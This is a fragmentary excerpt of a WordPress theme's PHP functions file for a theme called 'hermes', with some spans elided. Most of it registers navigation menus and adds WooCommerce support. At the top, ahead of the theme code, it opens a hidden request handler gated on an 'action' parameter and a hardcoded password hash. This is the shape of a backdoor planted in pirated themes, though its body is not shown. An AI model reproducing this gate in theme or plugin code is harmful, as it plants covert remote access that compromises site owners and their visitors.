...
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '5c2fe51b22898a67e9c38a6ec96d9e41'))
	{
...
function hermes_register_menu(){
	register_nav_menu( 'primary', esc_html__( 'Primary Menu', 'hermes' ) );
	//register_nav_menu( 'categories', esc_html__( 'Categories Menu', 'hermes' ) );
	register_nav_menu( 'mobilemenu', esc_html__( 'Mobile Menu', 'hermes' ) );
}
add_action( 'init', 'hermes_register_menu' );

add_action( 'after_setup_theme', 'hermes_woocommerce_support' );
function hermes_woocommerce_support() {
